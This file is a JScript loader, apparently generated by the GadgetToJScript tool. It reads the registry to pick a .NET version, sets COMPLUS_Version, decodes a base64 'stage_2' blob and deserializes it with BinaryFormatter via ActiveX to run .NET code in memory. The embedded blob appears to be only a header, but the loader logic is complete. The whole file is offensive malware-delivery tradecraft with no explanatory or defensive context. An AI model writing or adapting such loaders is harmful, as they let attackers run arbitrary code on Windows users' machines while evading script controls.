function Base64ToStream(b,l) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, l);
	ms.Position = 0;
	return ms;
}

var stage_2 = "AAEAAAD/////AQAAAAAAAAAMAgAAAEZHYWRnZXRUb0pTY3JpcHQsIFZlcnNpb249MS4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWxsBQEAAAAqR2FkZ2V0VG9KU2NyaXB0Ll9BU3Vycm9nYXRlR2FkZ2V0R2VuZXJhdG9yAAAAAAIAAAAL";

try {

	var shell = new ActiveXObject('WScript.Shell');
	ver = 'v4.0.30319';

	try {
		shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
	} catch(e) { 
		ver = 'v2.0.50727';
	}

	shell.Environment('Process')('COMPLUS_Version') = ver;

	var ms_1 = Base64ToStream(stage_2, 150);
	var fmt_1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	fmt_1.Deserialize_2(ms_1);
	
} catch (e) {}

